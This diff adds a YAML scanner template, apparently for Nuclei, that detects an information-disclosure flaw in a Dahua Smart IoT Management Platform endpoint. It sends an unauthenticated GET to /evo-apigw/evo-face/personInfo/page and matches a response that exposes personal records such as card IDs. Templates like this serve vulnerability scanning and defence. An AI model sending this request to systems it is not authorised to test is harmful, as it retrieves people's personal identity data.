@@ -1,0 +1,24 @@
+id: poc-yaml-dahua-evo-face-personinfo-infoleak
+info:
+  name: Dahua Smart IoT Management Platform /personInfo/page Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: infoleak
+http:
+  - raw:
+      - |
+        GET /evo-apigw/evo-face/personInfo/page HTTP/1.1
+        Host: {{Hostname}}
+        Range: bytes=0-5000
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"success"'
+          - '"pageData"'
+          - '"cardtypeStr"'
+          - '"cardid"'
+        part: body
